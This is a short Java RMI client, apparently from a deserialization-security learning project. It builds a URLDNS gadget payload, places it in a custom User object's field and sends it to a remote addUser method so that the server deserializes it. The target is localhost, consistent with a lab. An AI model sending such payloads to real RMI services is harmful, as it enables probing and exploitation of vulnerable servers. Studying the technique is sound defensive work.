package run.ergou.rmi;

import run.ergou.rmi.interfaces.IUserList;
import run.ergou.rmi.customclass.User;
import run.ergou.rmi.util.CreateURLDNS;

import java.rmi.Naming;
import java.util.HashMap;

public class RMIClientCustom {
    public static void main(String[] args) throws Exception {

        IUserList userList = (IUserList) Naming.lookup("rmi://localhost:1099/users");

        // 创建反序列化payload对象
        HashMap hashMap = CreateURLDNS.create();

        // 自定义类Object属性赋值反序列化payload对象
        User user = new User();
        user.object = hashMap;

        // 调用远程对象方法
        userList.addUser(user);

    }
}
